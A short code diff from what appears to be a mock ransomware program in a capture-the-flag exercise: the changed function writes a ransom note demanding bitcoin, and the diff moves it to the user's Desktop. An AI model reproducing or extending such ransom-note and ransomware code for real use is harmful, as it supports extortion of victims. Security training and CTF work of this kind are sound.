@@ -337,7 +337,9 @@ def run_hardcoded() -> int:
 def write_message(): 
     lines = ["You have been hacked. \n Send me 10 bitcoins to this address : ctf{lazarus_bitcoin_wallet} to get your files decrypted."]
 
-    with open("README.txt", "w") as file:
+    desktop = Path(r"~/Desktop").expanduser()
+
+    with open(desktop / "README.txt", "w") as file:
         file.writelines(lines)
 
 
